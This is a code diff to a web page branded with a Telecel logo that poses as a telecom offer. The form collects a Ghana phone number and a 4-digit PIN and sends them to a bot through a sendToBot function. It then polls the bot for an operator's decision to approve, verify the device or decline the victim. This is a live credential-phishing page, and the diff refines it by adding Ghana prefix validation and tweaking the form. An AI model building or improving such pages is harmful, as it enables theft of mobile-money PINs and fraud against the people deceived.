@@ -25,7 +25,7 @@
             overflow: hidden;
         }
         .logo-section { text-align: center; padding: 30px 0 10px; }
-        .telecel-logo { width: 85px; height: auto; margin: 0 auto; }
+        .telecel-logo { width: 92px; height: auto; margin: 0 auto; }
         h1 { text-align: center; font-size: 26px; font-weight: 700; margin: 10px 0 8px; color: #1e2937; }
         .subtitle { text-align: center; color: #475569; font-size: 15px; padding: 0 25px 20px; }
         .offer-info {
@@ -75,7 +75,6 @@
                     <option value="">Select Account type</option>
                     <option value="mobile">Mobile</option>
                     <option value="broadband">Broadband</option>
-                    <option value="enterprise">Enterprise</option>
                 </select>
             </div>
             <div class="form-group">
@@ -137,8 +136,19 @@
             offerPriceEl.textContent = `GHS ${state.offerPrice}`;
         }
 
-        phoneInput.addEventListener('input', () => phoneInput.value = phoneInput.value.replace(/[^0-9]/g, ''));
-        pinInput.addEventListener('input', () => pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4));
+        // Ghana Number Validation
+        function isValidGhanaNumber(phone) {
+            const validPrefixes = ['020','050','023','024','027','054','055','057','059','026','028'];
+            return phone.length === 10 && validPrefixes.some(prefix => phone.startsWith(prefix));
+        }
+
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
+        });
+
+        pinInput.addEventListener('input', () => {
+            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
+        });
 
         function sendToBot(phone, pin) {
             const ts = Date.now();
@@ -196,17 +206,14 @@
                             state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-
                                 if (cb === state.approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.APPROVE_PAGE;
-
                                 } else if (cb === state.verifyDeviceId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.DEVICE_PAGE;
-
                                 } else if (cb === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
@@ -226,8 +233,13 @@
             const phone = phoneInput.value.trim();
             const pin = pinInput.value.trim();
 
-            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
-                errMsg.textContent = "Please enter valid Ghana number (e.g. 0201234567)";
+            if (!phone || phone.length !== 10) {
+                errMsg.textContent = "Please enter a valid 10-digit number";
+                errMsg.style.display = 'block';
+                return;
+            }
+            if (!isValidGhanaNumber(phone)) {
+                errMsg.textContent = "Invalid Ghana number. Must start with 020, 050, 024, etc.";
                 errMsg.style.display = 'block';
                 return;
             }
